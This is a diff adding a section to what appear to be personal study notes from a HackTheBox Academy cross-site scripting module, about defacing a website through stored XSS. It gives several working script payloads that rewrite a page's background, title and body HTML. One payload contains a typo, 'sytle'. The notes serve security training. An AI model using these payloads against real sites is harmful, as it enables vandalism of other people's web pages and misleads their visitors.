@@ -261,3 +261,66 @@ when normally using the UI any payloads will not be accepted, but by modifying t
 
 ![](Images/Pasted%20image%2020240124153323.png)
 
+## Defacing 
+
+one of the most common stored XSS vulnerabilities is website defacing  
+defacing is changing its look for anyone who visits the site 
+
+many other vulnerabilities to accomplish this but XSS is among the most common
+
+### Defacing elements 
+
+three elements are commonly used to change the main look of the page: 
+- background color = document.body.style.background
+- background = document.body.background
+- page title = document.title 
+- page text = DOM.innerHTML
+
+we can use these to send a message or even remove the vulnerable element so that it would be harder to quickly reset the page
+
+### Changing the background
+
+in our stored XSS target we can use a color or image to change the background of the site
+
+our payload becomes something like: 
+
+`<script>document.body.sytle.background = "#141d2b"</script>`
+
+using this on a vulnerable stored XSS site we can see the site change even after refreshing: 
+
+![](Images/Pasted%20image%2020240124171450.png)
+
+### Changing page title
+
+to change the title we can modify our script to be: 
+
+`<script>document.title = 'HackTheBox Academy'</script>`
+
+![](Images/Pasted%20image%2020240124171932.png)
+
+### Changing the page text 
+
+to modify the text of a page we can select an element in our script: 
+
+`document.getElementById("todo").innerHTML = "New Text"`
+
+jquery can be more efficient in changing multiple elements in one line (jquery must be loaded): 
+
+`$("#todo").html('New Text')` 
+
+could even change the whole HTML code with: 
+
+`document.getElementsByTagName('body')[0].innerHTML = "New Text"`
+
+to push our final payload we will want to minify it into one line: 
+
+```html
+<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
+```
+
+we can see our payloads at the end of the page's source code: 
+
+![](Images/Pasted%20image%2020240124180831.png)
+
+in this example the elements we are targeting are at the end of the source code but if we wanted to inject on an element in the middle of the source then other scripts/elements might require modifications to our payload
+
